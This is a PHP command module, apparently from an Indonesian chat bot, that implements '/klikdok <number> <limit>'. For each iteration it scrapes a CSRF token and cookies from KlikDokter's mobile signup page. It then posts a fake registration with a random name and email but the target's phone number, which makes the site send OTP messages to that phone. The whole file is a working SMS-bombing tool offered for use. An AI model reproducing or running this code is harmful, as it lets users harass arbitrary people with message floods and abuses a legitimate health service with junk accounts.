<?php

namespace src;

class KlikDokter
{
    public function __construct($app)
    {
        $this->app = $app;
    }
 
    public function otp()
    {
        if (count($this->app->texts) < 3) {
            return $this->app
                ->repply(join("\n", array("❌ ``` Upps pesan tidak lengkap ```\n", '➡️ USAGE : */klikdok* <nomor> <limit>', '➡️ EX : */klikdok* 0877 5')))
                ->markdown()
                ->send();
        } elseif (!is_numeric($this->app->texts[1])) {
            return $this->app
                ->repply(join("\n", array("❌ ``` Upps nomor tidak valid ```\n", '➡️ USAGE : */klikdok* <nomor> <limit>', '➡️ EX : */klikdok* 0877 5')))
                ->markdown()
                ->send();
        } elseif (!is_numeric($this->app->texts[2])) {
            return $this->app
                ->repply(join("\n", array("❌ ``` Upps limit tidak valid ```\n", '➡️ USAGE : */klikdok* <nomor> <limit>', '➡️ EX : */klikdok* 0877 5')))
                ->markdown()
                ->send();
        } elseif ($this->app->texts[2] > 5) {
            return $this->app
                ->repply('❌ Limit tidak boleh lebih dari *5* untuk menghindari Timeout.')
                ->markdown()
                ->send();
        } else {
            return $this->send();
        }
    }

    private function send()
    {
        $count = 0;
        while ($count < $this->app->texts[2]) {
            $count++;
            $name = substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'),1,10);
            $email = $name.'___@gmail.com';
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.klikdokter.com/users/create/');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, AGENT);
            curl_setopt($ch, CURLOPT_REFERER, 'https://m.klikdokter.com/');
            $response = curl_exec($ch);
            curl_close($ch);
            $cookies = [];
            preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $cookie);
            foreach (isset($cookie[1]) ? $cookie[1] : [] as $kuki) {
                $cookies[] = $kuki;
            }
            preg_match('/name=\"_token\" type=\"hidden\" value=\"(.*?)\">/', $response, $token);
            $cookies[] = isset($token[1]) ? $token[1] : '';
            $param     = http_build_query([
                '_token'    => isset($cookies[2]) ? $cookies[2] : '',
                'full_name' => $name,
                'email'     => $email,
                'phone'     => $this->app->texts[1],
                'back-to'   => 'https://m.klikdokter.com/',
                'submit'    => 'Daftar'
            ]);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.klikdokter.com/users/check');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
            curl_setopt($ch, CURLOPT_USERAGENT, AGENT);
            curl_setopt($ch, CURLOPT_REFERER, 'https://m.klikdokter.com/users/create/');
            curl_setopt($ch, CURLOPT_COOKIE, isset($cookies[1]) ? $cookies[1] : '');
            $response = curl_exec($ch);
            curl_close($ch);
            sleep(1);
        }
        return $this->app
            ->repply('☑️ Done')
            ->send();
    }
}